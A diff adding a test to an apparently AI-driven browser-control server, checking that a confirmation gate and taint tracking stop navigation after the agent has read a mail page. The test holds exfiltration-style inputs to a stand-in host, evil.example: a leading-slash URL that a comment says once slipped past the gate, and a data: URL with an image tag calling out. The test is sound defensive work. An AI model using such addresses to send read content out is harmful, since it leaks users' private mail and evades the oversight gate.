@@ -318,3 +318,25 @@ test('reading, listing and going somewhere are put to the gate, so Never and loc
   assert.deepEqual(asked, ['chrome.read', 'chrome.read', 'chrome.read', 'chrome.read', 'chrome.read', 'chrome.navigate'])
   assert.deepEqual(host.tools(from), [], 'nothing reached the browser')
 })
+
+test('chrome_navigate judges and opens the address as the browser will, and answers with the origin only', async () => {
+  const gate = fakeGate('no')
+  const taint = chrome.createTaint({ gate })
+  const server = chrome.chromeServer({ allowWrites: false, gate, taint })
+  await call(server, 'chrome_page_text', { tabId: 501 })
+  const from = host.seen.length
+  // A leading slash once walked past the question as "a path on this disk".
+  const sneaky = await call(server, 'chrome_navigate', { url: '/evil.example/?q=subjects', tabId: 501 })
+  assert.equal(sneaky.isError, true)
+  assert.deepEqual(gate.asked.map((q) => q.prompt), ['You just read mail.google.com. Go to evil.example now?'])
+  const inline = await call(server, 'chrome_navigate', { url: 'data:text/html,<img src=https://evil.example/?q=1>', tabId: 501 })
+  assert.equal(inline.isError, true)
+  assert.match(textOf(inline), /only open web addresses/)
+  assert.ok(!host.tools(from).includes('navigate'), 'neither reached the browser')
+
+  const plain = chrome.chromeServer({ allowWrites: false, gate: fakeGate('yes') })
+  const out = await call(plain, 'chrome_navigate', { url: 'news.example/today', tabId: 501 })
+  assert.equal(out.isError, undefined, textOf(out))
+  assert.equal(textOf(out), 'Navigated to https://news.example. Read the page to see what is there.')
+  assert.equal(host.browser.tabs.find((t) => t.tabId === 501).url, 'https://news.example/today')
+})
